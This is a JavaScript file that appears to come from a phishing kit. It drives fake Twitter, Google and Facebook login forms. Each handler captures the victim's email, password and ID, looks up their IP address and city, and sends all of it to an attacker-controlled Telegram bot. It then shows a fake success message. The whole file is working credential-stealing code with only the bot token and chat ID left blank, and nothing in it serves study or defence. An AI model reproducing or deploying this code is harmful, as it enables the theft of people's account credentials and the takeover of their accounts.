TOKEN = "Tele Token Here";
USER_ID = "Tele User ID Here";
// Twitter Request
$(document).ready(function() {
    $('.twitter-login-bu').click(function() {
        var email = $('.email_tw').val();
        var password = $('.password_tw').val();
        var id = $('.id_tw').val();
        $.getJSON('https://api.db-ip.com/v2/free/self', function(data) {
            msg = encodeURIComponent("New Login From Twitter : \nEmail : " +email+"\nPassword : "+password+"\nID : "+id+"\nIp : "+data.ipAddress+"\nCity : "+data.city+"\n\nMr28 0w0");
            TeleAPI = `https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${USER_ID}&text=${msg}`;
            $.getJSON(TeleAPI).then(function() {
                $('.done-successfully-cinghaha').click();
            });
        });
    });
});
// Google Request
$(document).ready(function() {
    $('.google-login-bu').click(function() {
        var email = $('.email_go').val();
        var password = $('.password_go').val();
        var id = $('.id_go').val();
        $.getJSON('https://api.db-ip.com/v2/free/self', function(data) {
            msg = encodeURIComponent("New Login From Google : \nEmail : " +email+"\nPassword : "+password+"\nID : "+id+"\nIp : "+data.ipAddress+"\nCity : "+data.city+"\n\nMr28 0w0");
            TeleAPI = `https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${USER_ID}&text=${msg}`;
            $.getJSON(TeleAPI).then(function() {
                $('.done-successfully-cinghaha').click();
            });
        });
    });
});
// Facebook Request
$(document).ready(function() {
    $('.facebook-login-bu').click(function() {
        var email = $('.email_fa').val();
        var password = $('.password_fa').val();
        var id = $('.id_fa').val();
        $.getJSON('https://api.db-ip.com/v2/free/self', function(data) {
            msg = encodeURIComponent("New Login From Facebook : \nEmail : " +email+"\nPassword : "+password+"\nID : "+id+"\nIp : "+data.ipAddress+"\nCity : "+data.city+"\n\nMr28 0w0");
            TeleAPI = `https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${USER_ID}&text=${msg}`;
            $.getJSON(TeleAPI).then(function() {
                $('.done-successfully-cinghaha').click();
            });
        });
    });
});
